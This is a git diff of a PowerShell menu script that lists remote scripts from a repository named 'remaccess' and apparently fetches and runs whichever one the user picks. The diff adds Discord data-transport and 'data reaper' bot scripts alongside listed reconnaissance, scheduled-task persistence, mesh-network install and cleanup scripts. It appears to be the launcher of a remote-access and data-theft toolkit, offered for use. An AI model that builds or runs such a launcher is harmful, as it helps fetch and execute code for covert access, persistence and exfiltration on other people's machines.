@@ -2,7 +2,6 @@ function Show-ActionMenu {
     param (
         [array] $Actions
     )
-
     while ($true) {
         Write-Host "Choose an action to execute or type 'q' to quit:" -ForegroundColor Yellow
         
@@ -12,7 +11,6 @@ function Show-ActionMenu {
             Write-Host "$index. $fileName"
             $index++
         }
-
         $selectedActionIndex = Read-Host "Enter the number of the action you want to execute or type 'q' to quit"
 
         if ($selectedActionIndex -eq 'q') {
@@ -27,7 +25,6 @@ function Show-ActionMenu {
             }
             break
         }
-
         if ($selectedActionIndex -ge 1 -and $selectedActionIndex -le $Actions.Count) {
             $selectedUrl = $Actions[$selectedActionIndex - 1]
             $selectedAction = [System.IO.Path]::GetFileNameWithoutExtension($selectedUrl)
@@ -40,16 +37,16 @@ function Show-ActionMenu {
         }
     }
 }
-
 # Define an array of action URLs
 $actions = @(
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/BasicInletValveInstall.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/MeshNetworkInstall.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/SearchDog.ps1",
+    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/DiscordDataTransportBot.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/ReconService.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/TaskSchedulerServiceCreater.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/PingTaskSchedulerCreator.ps1",
-    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/Executeables.ps1",
+    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/DiscortAutoDataReaperBots.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CleanUp.ps1"
 )
 
